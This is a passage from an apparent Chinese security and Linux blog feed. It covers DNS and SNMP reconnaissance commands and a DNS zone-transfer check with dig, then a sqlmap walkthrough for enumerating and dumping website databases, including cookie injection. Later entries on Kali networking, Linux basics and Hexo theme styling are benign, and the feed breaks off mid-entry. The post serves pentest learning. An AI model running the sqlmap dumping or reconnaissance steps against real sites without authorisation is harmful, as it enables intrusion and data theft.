WhoIs查询</h2><p>一个域名的所有者可以通过查询WHOIS数据库而被找到；对于大多数根域名服务器，基本的WHOIS由ICANN维护，而WHOIS的细节则由控制那个域的域注册机构维护。</p><p>对于240多个国家代码顶级域名（ccTLDs），通常由该域名权威注册机构负责维护WHOIS。</p><h2 id="域名基本信息查询"><a href="#域名基本信息查询" class="headerlink" title="域名基本信息查询"></a>域名基本信息查询</h2><blockquote><ol><li>DNS服务器查询</li></ol></blockquote><p>除了whois查询之外，我们还可以通过host命令来查询dns服务器，命令格式为：</p><p><code>host -t ns domainName</code></p><blockquote><ol start="2"><li>A记录查询</li></ol></blockquote><p>A (Address) 记录是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的web server上。同时也可以设置您域名的子域名。通俗来说A记录就是服务器的IP,域名绑定A记录就是告诉DNS,当你输入域名的时候给你引导向设置在DNS的A记录所对应的服务器。<br>通过<br><code>host -t a domainName</code><br>可以查询a记录</p><blockquote><p>MX记录查询</p></blockquote><p>MX记录也叫做邮件路由记录，用户可以将该域名下的邮件服务器指向到自己的mail server上，然后即可自行操控所有的邮箱设置。您只需在线填写您服务器的IP地址，即可将您域名下的邮件全部转到您自己设定相应的邮件服务器上。<br>简单的说，通过操作MX记录，您才可以得到以您域名结尾的邮局。</p><p>通过<br><code>host -t mx domainName</code><br>可以查询该域名下的mx记录，从而可以得到邮件服务器信息。</p><h2 id="域名枚举"><a href="#域名枚举" class="headerlink" title="域名枚举"></a>域名枚举</h2><p>在得到主域名信息之后，如果能通过主域名得到所有子域名信息，在通过子域名查询其对应的主机IP，这样我们能得到一个较为完整的信息。</p><blockquote><p>fierce</p></blockquote><p><code>fierce -dns domainName</code></p><blockquote><p>DNSenum</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;dnsenum --enum adomainnameontheinternet.com</span><br></pre></td></tr></table></figure></div><p>我们可以使用一些额外的选项来运行DNSenum，它们包括这些东西：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- threads [number] 允许你设置一次所运行的线程数量。</span><br><span class="line">-r 允许你开启递归查找。</span><br><span class="line">-d 允许你设置在WHOIS请求之间的时间延迟，单位为秒。</span><br><span class="line">-o 允许我们制定输出位置。</span><br><span class="line">-w 允许我们开启WHOIS查询。</span><br></pre></td></tr></table></figure></div><p>我们可以使用另一个命令 snmpwalk 来检测Windows主机。Snmpwalk是一个使用SNMP<br>GETNEXT请求在网络实体中查询信息树的SNMP应用。在命令行中键入下列命令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -c public 192.168.10.200 -v 2c</span><br></pre></td></tr></table></figure></div><p>获取windows系统进程数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 192.168.1.200 .1.3.6.1.2.1.25.1.6</span><br><span class="line"></span><br><span class="line">这条命令的意思是：使用v1版本，共同体为public，来对192.168.1.200的.1.3.6.1.2.1.25.1.6分支进行walk。</span><br></pre></td></tr></table></figure></div><p>获取windows系统总内存</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 192.168.1.200 .1.3.6.1.2.1.25.2.2</span><br></pre></td></tr></table></figure></div><p>获取windows系统的IP地址</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 192.168.1.200 .1.3.6.1.2.1.4.20.1.1</span><br></pre></td></tr></table></figure></div><p>获取windows系统信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 192.168.1.200 system</span><br></pre></td></tr></table></figure></div><p>获取windows系统的网卡信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 192.168.1.200 -c public ifDescr</span><br></pre></td></tr></table></figure></div><h3 id="反向地址解析"><a href="#反向地址解析" class="headerlink" title="反向地址解析"></a>反向地址解析</h3><p>我们经常使用到得DNS服务器里面有两个区域，即“正向查找区域”和“反向查找区域”，正向查找区域就是我们通常所说的域名解析，反向查找区域即是这里所说的IP反向解析，它的作用就是通过查询IP地址的PTR记录来得到该IP地址指向的域名，当然，要成功得到域名就必需要有该IP地址的PTR记录。PTR记录是邮件交换记录的一种，邮件交换记录中有A记录和PTR记录，A记录解析名字到地址，而PTR记录解析地址到名字。地址是指一个客户端的IP地址，名字是指一个客户的完全合格域名。通过对PTR记录的查询，达到反查的目的。</p><p>反向域名解析系统(Reverse DNS)的功能确保适当的邮件交换记录是生效的。反向域名解析与通常的正向域名解析相反，提供IP地址到域名的对应。IP反向解析主要应用到邮件服务器中来阻拦垃圾邮件，特别是在国外。多数垃圾邮件发送者使用动态分配或者没有注册域名的IP地址来发送垃圾邮件，以逃避追踪，使用了域名反向解析后，就可以大大降低垃圾邮件的数量。</p><p>比如你用 <a href="mailto:xxx@name.com">xxx@name.com</a> 这个邮箱给我的邮箱 <a href="mailto:123@163.com">123@163.com</a> 发了一封信。163邮件服务器接到这封信会查看这封信的信头文件，这封信的信头文件会显示这封信是由哪个IP地址发出来的。然后根据这个IP地址进行反向解析，如果反向解析到这个IP所对应的域名是name.com 那么就接受这封邮件，如果反向解析发现这个IP没有对应到name.com，那么就拒绝这封邮件。</p><p>由于在域名系统中，一个IP地址可以对应多个域名，因此从IP出发去找域名，理论上应该遍历整个域名树，但这在Internet上是不现实的。为了完成逆向域名解析，系统提供一个特别域，该特别域称为逆向解析域in-addr.arpa。这样欲解析的IP地址就会被表达成一种像域名一样的可显示串形式，后缀以逆向解析域域</p><p>名”in-addr.arpa”结尾。</p><p>例如一个IP地址：222.211.233.244，其逆向域名表达方式为：244.233.221.222.in-addr.arpa</p><p>两种表达方式中IP地址部分顺序恰好相反，因为域名结构是自底向上(从子域到域)，而IP地址结构是自顶向下(从网络到主机)的。实质上逆向域名解析是将IP地址表达成一个域名,以地址做为索引的域名空间,这样逆向解析的很大部分可以纳入正向解析中。</p><p>linux中常用的反向解析工具为nslookup和dig。</p><p>使用dig进行反向解析的命令格式为：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig -x ip @dnsserver        #用 dig 查看反向解析</span><br></pre></td></tr></table></figure></div><h2 id="DNS区域传送漏洞"><a href="#DNS区域传送漏洞" class="headerlink" title="DNS区域传送漏洞"></a>DNS区域传送漏洞</h2><p>很多dns探测工具，都会首先尝试dns区域传送，然后才是暴力枚举，那么什么是DNS区域传送漏洞呢？</p><p>区域传送操作指的是一台后备服务器使用来自主服务器的数据刷新自己的zone数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主域名服务器因意外故障变得不可用时影响到全局。一般来说，DNS区域传送操作只在网络里真的有后备域名DNS服务器时才有必要执行，但许多DNS服务器却被错误地配置成只要有人发出请求，就会向对方提供一个zone数据库的拷贝。如果所提供的信息只是与连到因特网上且具备有效主机名的系统相关，那么这种错误配置不一定是坏事，尽管这使得攻击者发现潜在目标要容易得多。真正的问题发生在一个单位没有使用公用/私用DNS机制来分割外部公用DNS信息和内部私用DNS信息的时候，此时内部主机名和IP地址都暴露给了攻击者。把内部IP地址信息提供给因特网上不受信任的用户，就像是把一个单位的内部网络完整蓝图或导航图奉送给了别人。</p><p>使用dig工具可以检测dns 区域传送漏洞，语法如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig axfr @域名服务器 被检测域名</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;DNS信息收集&quot;&gt;&lt;a href=&quot;#DNS信息收集&quot; class=&quot;headerlink&quot; title=&quot;DNS信息收集&quot;&gt;&lt;/a&gt;DNS信息收集&lt;/h1&gt;&lt;h2 id=&quot;1-DNS&quot;&gt;&lt;a href=&quot;#1-DNS&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="Linux" scheme="https://kabeor.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SQLMAP介绍</title>
    <link href="https://kabeor.github.io/SQLMAP%E4%BB%8B%E7%BB%8D/"/>
    <id>https://kabeor.github.io/SQLMAP%E4%BB%8B%E7%BB%8D/</id>
    <published>2018-02-06T16:00:00.000Z</published>
    <updated>2020-03-16T04:49:54.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ASP网站渗透"><a href="#ASP网站渗透" class="headerlink" title="ASP网站渗透"></a>ASP网站渗透</h1><p>常用： 明小子，啊D，NBSI，御剑</p><p>asp网站常用access（文件数据库）</p><p><code>sqlmap -u &quot;网站&quot;</code><br>-u检测是否存在注入漏洞，返回数据库名<br><code>sqlmap -u &quot;网站&quot; --tables</code><br>-tables猜解所有表名</p><p>找到用户表</p><p><code>sqlmap -u &quot;网站&quot; --columns -T &quot;表名&quot;</code><br>–columns根据表猜解列名</p><p><code>sqlmap -u &quot;网站&quot; --dump -C &quot;列名&quot; -T &quot;表名&quot;</code><br>–dump下载数据</p><h1 id="PHP网站渗透"><a href="#PHP网站渗透" class="headerlink" title="PHP网站渗透"></a>PHP网站渗透</h1><p>检测<br><code>sqlmap -u &quot;网站&quot;</code></p><p><code>sqlmap -u &quot;网站&quot; --is-dba</code></p><p>列出所有数据库<br><code>sqlmap -u &quot;网站&quot; -dbs</code></p><p>查找自己数据库<br><code>sqlmap -u &quot;网站&quot; --current-db</code></p><p>猜解所有表名，根据数据库查询<br><code>sqlmap -u &quot;网站&quot; --tables -D&quot;数据库名&quot;</code></p><p><code>sqlmap -u &quot;网站&quot; --columns -T &quot;表名&quot; -D &quot;数据库名&quot;</code></p><p>查询列的字段<br><code>sqlmap -u &quot;网站&quot; --dump -C &quot;列名&quot; -T &quot;表名&quot; -D &quot;数据库名&quot;</code></p><h1 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h1><p><code>sqlmap -u &quot;网站&quot; --cookie &quot;id=参数&quot; --level 2</code><br>cookie注入需要提升权限为2</p><p>猜解<br><code>sqlmap -u &quot;网站&quot; --tables --cookie &quot;id=参数&quot; --level 2</code></p><p><code>sqlmap -u &quot;网站&quot; --columns -T &quot;表名&quot; --cookie &quot;id=参数&quot; --level 2</code></p><p><code>sqlmap -u &quot;网站&quot; --dump -C &quot;列名&quot; -T &quot;表名&quot; --cookie &quot;id=参数&quot; --level 2</code></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;ASP网站渗透&quot;&gt;&lt;a href=&quot;#ASP网站渗透&quot; class=&quot;headerlink&quot; title=&quot;ASP网站渗透&quot;&gt;&lt;/a&gt;ASP网站渗透&lt;/h1&gt;&lt;p&gt;常用：</summary>
        
      
    
    
    
    <category term="Linux" scheme="https://kabeor.github.io/categories/Linux/"/>
    
    <category term="Kali" scheme="https://kabeor.github.io/categories/Linux/Kali/"/>
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="SQLMAP" scheme="https://kabeor.github.io/tags/SQLMAP/"/>
    
  </entry>
  
  <entry>
    <title>Kali及Parrot问题解决方案</title>
    <link href="https://kabeor.github.io/Kali%E5%8F%8AParrot%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://kabeor.github.io/Kali%E5%8F%8AParrot%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2018-02-03T16:00:00.000Z</published>
    <updated>2020-03-16T04:45:07.959Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Kali及Parrot问题解决方案"><a href="#Kali及Parrot问题解决方案" class="headerlink" title="Kali及Parrot问题解决方案"></a>Kali及Parrot问题解决方案</h1><h2 id="1-网络问题"><a href="#1-网络问题" class="headerlink" title="1.网络问题"></a>1.网络问题</h2><h3 id="上网方式"><a href="#上网方式" class="headerlink" title="上网方式"></a><strong>上网方式</strong></h3><blockquote><p>  1.桥接   （宽带下不可用！！！）</p></blockquote><p><strong><em>虚拟机与主机在同一个网段中</em></strong>，并且也要为虚拟机分配一个IP地址（不要与主机IP地址相同，也不要与主机所在局域网中的其他计算机IP地址相同），为虚拟机设置子网掩码、网关地址、DNS地址。除了IP地址不同，其他都相同。</p><blockquote><p>2.NAT</p></blockquote><p>虚拟机使用“NAT”（即VMnet8）虚拟网卡，并且在虚拟机中设置为“自动获得地址”，虚拟机就可以上网</p><blockquote><p><strong>网络故障问题的解决方法</strong></p><p>1.查看自己ip地址、子网掩码等信息</p></blockquote><pre><code>ifconfig </code></pre><p>如不显示inet地址，则可能是smbd.server没开，应输入</p><pre><code>/etc/init.d/smbd start</code></pre><p>或输入</p><pre><code>dhclient eth0</code></pre><p>命令来获取IP地址<br>再输入ifconfig命令，就能看到eth0已经有IP地址了</p><blockquote><p>2.配置网络</p></blockquote><pre><code>vi /etc/network/interfaces</code></pre><p>修改为如下形式<br>            #This file describes the network interfaces available on your system<br>            # and how to activate them. For more information, see interfaces(5).</p><pre><code># The loopback network interface auto lo iface lo inet loopback# The primary network interfaceallow-hotplug eth0iface eth0 inet static                //配置eth0使用默认的静态地址# address 192.168.0.133        //设置eth0的IP地址# netmask 255.255.255.0          //配置eth0的子网掩码# gateway 192.168.0.254        //配置当前主机的默认网关  waddress ether 00:50:56:3D:9E:D2      //配置MAC地址</code></pre><p>修改文件夹内文本数据时用vi命令，i键进入修改模式，修改后按ESC退出修改模式，输入 ：w 保存，输入 ：q 退出文件</p><blockquote><p>配置DNS</p></blockquote><p>Kali Linux的DNS服务器地址使用文件“/etc/resovl.conf”进行配置，用户可以通过“nameserver”配置项设置DNS服务器的 IP地址；<br>“resolv.conf”文件中最多可以使用“nameserver”指定３个DNS服务器，按照先后的顺序，一旦前面的DNS服务器失效，系统将自动使用后面的DNS服务器。<br>对于“resolv.conf”文件设置“nameserver”的修改是即时生效的，即只要对“resolv.conf”文件的修改进行了保存，在系统下一次需要进行域名的解析时就会按照该文件中指定的DNS服务器IP地址进行域名的解析。</p><pre><code>vi /etc/resovl.conf</code></pre><p>修改格式如下<br>         # Generated by NetworkManager<br>         nameserver 192.168.229.2     //Nat模式下为虚拟机网卡IP，桥接模式下为主机分配的IP<br>         nameserver 114.114.114.114<br>         nameserver 8.8.8.8</p><blockquote><p>重启网卡</p></blockquote><pre><code>/etc/init.d/networking restart</code></pre><blockquote><p>ping</p></blockquote><pre><code>ping 114.114.114.114ping 8.8.8.8</code></pre><blockquote><p>Parrot网络管理显示device not managed</p></blockquote><ol><li><p>编辑/etc/NetworkManager/NetworkManager.conf：</p><p> sudo vi /etc/NetworkManager/NetworkManager.conf<br>将其中的managed=false改为managed=true</p></li></ol><p>2.重启network-manager service：</p><pre><code>sudo service network-manager restart</code></pre><p>####其他问题</p><blockquote><p>parrot的软件安装</p></blockquote><pre><code>apt-get install 工具名apt-get install parrot-tools-full                          //将装入full版parrot</code></pre><p>更换更新源</p><pre><code>vi /etc/apt/sources.list.d/parrot.list</code></pre><p>中科大源</p><pre><code>#stable repositorydeb http://mirrors.ustc.edu.cn/parrot/ parrot main contrib non-free#deb-src http://mirrors.ustc.edu.cn/parrot/ parrot main contrib non-free</code></pre><p>清华源</p><pre><code>#stable repositorydeb http://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free#deb-src http://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free</code></pre><p>安装VMtools</p><pre><code>sudo apt-get updatesudo apt-get install open-vm-tools-desktop fuse然后重新登录</code></pre><blockquote><p>parrot网络配置</p></blockquote><p>同kali（vim出现某些问题，需到相应路径下以管理员身份打开）</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Kali及Parrot问题解决方案&quot;&gt;&lt;a href=&quot;#Kali及Parrot问题解决方案&quot; class=&quot;headerlink&quot; title=&quot;Kali及Parrot问题解决方案&quot;&gt;&lt;/a&gt;Kali及Parrot问题解决方案&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="Linux" scheme="https://kabeor.github.io/categories/Linux/"/>
    
    <category term="网络" scheme="https://kabeor.github.io/categories/Linux/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="Linux" scheme="https://kabeor.github.io/tags/Linux/"/>
    
    <category term="Parrot" scheme="https://kabeor.github.io/tags/Parrot/"/>
    
  </entry>
  
  <entry>
    <title>Linux command line 笔记</title>
    <link href="https://kabeor.github.io/Linux%20command%20line%20%E7%AC%94%E8%AE%B0/"/>
    <id>https://kabeor.github.io/Linux%20command%20line%20%E7%AC%94%E8%AE%B0/</id>
    <published>2018-02-03T16:00:00.000Z</published>
    <updated>2020-03-16T04:45:19.298Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-command-line-笔记"><a href="#Linux-command-line-笔记" class="headerlink" title="Linux command line 笔记"></a>Linux command line 笔记</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>1.图形用户界面（GUI）</p><p>2.命令行界面（CLI）</p><blockquote></blockquote><h2 id="2-shell"><a href="#2-shell" class="headerlink" title="2 shell"></a>2 shell</h2><blockquote><p>终端：</p></blockquote><p>terminal</p><blockquote><p>shell 提示符：</p></blockquote><p>通常包括你的用户名 @ 主<br>机名，紧接着当前工作目录和一个美元符号。</p><p>如果提示符的最后一个字符是“#”, 而不是“$”, 那么这个终端会话就有超级用户权限。</p><p>如果你按下鼠标左键，沿着文本拖动鼠标（或者双击一个单词）高亮了一些文本，那么这些高亮的文本就被拷贝到了一个由 X 管理的缓冲区里面。然后按下鼠标中键，这些文本就被粘贴到光标所在的位置。</p><p>设置聚焦策略为“聚焦跟随<br>着鼠标”，可以使拷贝和粘贴更方便易用。</p><h3 id="简单命令"><a href="#简单命令" class="headerlink" title="简单命令"></a>简单命令</h3><blockquote><p><strong>date</strong></p></blockquote><p>显示系统当前时间和日期</p><p>  <code>[me@linuxbox ~]$ date</code><br>  <code>Thu Oct 25 13:51:54 EDT 20</code></p><blockquote><p><strong>cal</strong></p></blockquote><p>显示当前月份的日历。</p><pre><code>[me@linuxbox ~]$ calOctober 2007  Su Mo Tu We Th Fr Sa  1 2 3 4 5 6  7 8 9 10 11 12 13  14 15 16 17 18 19 20  21 22 23 24 25 26 27  28 29 30 31</code></pre><blockquote><p><strong>df</strong></p></blockquote><p>查看磁盘空间</p><pre><code>[me@linuxbox ~]$ dfFilesystem 1K-blocks Used Available Use% Mounted on/dev/sda2 15115452 5012392 9949716 34% //dev/sda5 59631908 26545424 30008432 47% /home/dev/sda1 147764 17370 122765 13% /boottmpfs 256856 0 256856 0% /dev/shm</code></pre><blockquote><p><strong>free</strong></p></blockquote><p>显示空闲内存的数量</p><pre><code>[me@linuxbox ~]$ freetotal used free shared buffers cachedMem: 2059676 846456 1213220 044028 360568-/+ buffers/cache: 441860 1617816Swap: 1042428 0 1042428</code></pre><p><strong><em>可以通过关闭终端仿真器窗口，或者是在 shell 提示符下输入 exit 命令来终止一个终端会话</em></strong><br>终端会话都可以通过按下 Ctrl-Alt-F1 到<br>Ctrl-Alt-F6 访问。当一个会话被访问的时候，它会显示登录提示框，我们需要输入用户名和密<br>码。要从一个虚拟控制台转换到另一个，按下 Alt 和 F1-F6(中的一个)。返回图形桌面，按下<br>Alt-F7。</p><h2 id="3-文件系统中的跳转"><a href="#3-文件系统中的跳转" class="headerlink" title="3 文件系统中的跳转"></a>3 文件系统中的跳转</h2><blockquote><p>系统文件树</p></blockquote><p>Linux，总是只有一个单一的文件系统树，不管有多少个磁盘或者存储设备连接<br>到计算机上。</p><blockquote><p>pwd命令</p></blockquote><p> 显示当前工作目录</p><blockquote><p>ls命令</p></blockquote><p>列出一个目录包含的文件及子目录</p><blockquote><p>cd命令</p></blockquote><p>   要更改工作目录，我们用 cd 命令。输入 cd, 然后输入想要去的工作目录的路径名。<br>   路径名就是沿着目录树的分支到达想要的目录期间所经过的路线。路径名可通过两种方式来指定，一种是绝对路径，另一种是相对路径。</p><p>绝对路径开始于根目录，紧跟着目录树的一个个分支，一直到达所期望的目录或文件。</p><p>相对路径开始于工作目录。<br>在文件系统树中用一对特殊符号来表示相对位置。这对特殊符号是 “.”(点) 和 “..” (点点)。符号 “.” 指的是工作目录，”..” 指的是工作目录的父目录。</p><p><strong><em>在几乎所有的情况下，可以省略 “./”。它是隐含地。</em></strong></p><p>快捷键              运行结果<br>cd                  更改工作目录到你的家目录。<br>cd -                更改工作目录到先前的工作目录。<br>cd ˜user name       更改工作目录到用户家目录。例如, cd ˜bob 会更改工作目录到用户“bob”的家目录。</p><blockquote></blockquote>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Linux-command-line-笔记&quot;&gt;&lt;a href=&quot;#Linux-command-line-笔记&quot; class=&quot;headerlink&quot; title=&quot;Linux command line 笔记&quot;&gt;&lt;/a&gt;Linux command line</summary>
        
      
    
    
    
    
    <category term="Linux" scheme="https://kabeor.github.io/tags/Linux/"/>
    
    <category term="命令行" scheme="https://kabeor.github.io/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>对NexT主题风格的修改</title>
    <link href="https://kabeor.github.io/%E5%AF%B9NexT%E4%B8%BB%E9%A2%98%E9%A3%8E%E6%A0%BC%E7%9A%84%E4%BF%AE%E6%94%B9/"/>
    <id>https://kabeor.github.io/%E5%AF%B9NexT%E4%B8%BB%E9%A2%98%E9%A3%8E%E6%A0%BC%E7%9A%84%E4%BF%AE%E6%94%B9/</id>
    <published>2018-02-03T16:00:00.000Z</published>
    <updated>2020-03-16T04:32:05.017Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对NexT主题风格的修改"><a href="#对NexT主题风格的修改" class="headerlink" title="对NexT主题风格的修改"></a>对NexT主题风格的修改</h1><blockquote><p>对背景颜色的修改</p></blockquote><p>在source/css/_variables/custom.styl中添加：</p><p><code>$body-bg-color                = #f5f7f9</code></p><p>颜色可随意选择<br>一个好用的RGB颜色查询网站<a href="http://www.qiaozhezou.com/rgb.htm" target="_blank" rel="noopener">http://www.qiaozhezou.com/rgb.htm</a></p><blockquote><p>设置阅读全文</p></blockquote><p>在 主题配置文件 中找到：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_excerpt:</span><br><span class="line">  enable: true</span><br><span class="line">  length: 150</span><br></pre></td></tr></table></figure></div><p>默认截取的长度为 150 字符，可以根据需要自行设定</p><blockquote><p>给 hexo next 加上背景图片</p></blockquote><p>只需要在 themes\next\source\css_custom\custom.styl 文件中添加几行代码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@media screen and (min-width:1200px) &#123;</span><br><span class="line"></span><br><span class="line">    body &#123;</span><br><span class="line">    background-image:url(&#x2F;images&#x2F;background.jpg);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment:fixed;</span><br><span class="line">    background-position:50% 50%; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #footer a &#123;</span><br><span class="line">        color:#eee;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>添加顶部加载条</p></blockquote><p>修改主题配置文件(_config.yml)将pace: false改为pace: true</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Progress bar in the top during page loading.</span><br><span class="line">pace: true</span><br><span class="line"># Themes list:</span><br><span class="line">#pace-theme-big-counter</span><br><span class="line">#pace-theme-bounce</span><br><span class="line">#pace-theme-barber-shop</span><br><span class="line">#pace-theme-center-atom</span><br><span class="line">#pace-theme-center-circle</span><br><span class="line">#pace-theme-center-radar</span><br><span class="line">#pace-theme-center-simple </span><br><span class="line">#pace-theme-corner-indicator</span><br><span class="line">#pace-theme-fill-left</span><br><span class="line">#pace-theme-flash</span><br><span class="line">#pace-theme-loading-bar</span><br><span class="line">#pace-theme-mac-osx</span><br><span class="line">#pace-theme-minimal</span><br><span class="line"># For example</span><br><span class="line"># pace_theme: pace-theme-center-atom</span><br><span class="line">pace_theme: pace-theme-corner-indicator</span><br></pre></td></tr></table></figure></div><p>使用时只需要将list里的名称替换到下面example即可</p><blockquote><p>字体颜色，大小等修改</p></blockquote><p>都在</p><pre><code>next/source/_vaviables/base.styl</code></pre><p>中</p><blockquote><p>修改``代码块自定义样式</p></blockquote><p>打开\themes\next\source\css_custom\custom.styl,向里面加入：(颜色可以自己定义)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Custom styles.</span><br><span class="line">code &#123;</span><br><span class="line">    color: #ff7600;</span><br><span class="line">    background: #fbf7f8;</span><br><span class="line">    margin: 2px;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 大代码块的自定义样式</span><br><span class="line">.highlight, pre &#123;</span><br><span class="line">    margin: 5px 0;</span><br><span class="line">    padding: 5px;</span><br><span class="line">    border-radius: 3px;</span><br><span class="line">&#125;</span><br><span class="line">.highlight, code, pre &#123;</span><br><span class="line">    border: 1px solid #d6d6d6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>主页文章添加阴影效果</p></blockquote><p>打开\themes\next\source\css_custom\custom.styl,向里面加入：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 主页文章添加阴影效果</span><br><span class="line"> .post &#123;</span><br><span class="line">   margin-top: 60px;</span><br><span class="line">   margin-bottom: 60px;</span><br><span class="line">   padding: 25px;</span><br><span class="line">   -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">   -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>Hexo添加字数统计、阅读时长</p></blockquote><p>安装<br>如果没有安装 hexo-wordcount 插件，先安装该插件：</p><p><code>npm i --save hexo-wordcount</code></p><p>NexT 主题默认已经集成了文章【字数统计】、【阅读时长】统计功能，如果我们需要使用，只需要在主题配置文件 _config.yml 中打开 wordcount 统计功能即可。如下所示</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;willin&#x2F;hexo-wordcount</span><br><span 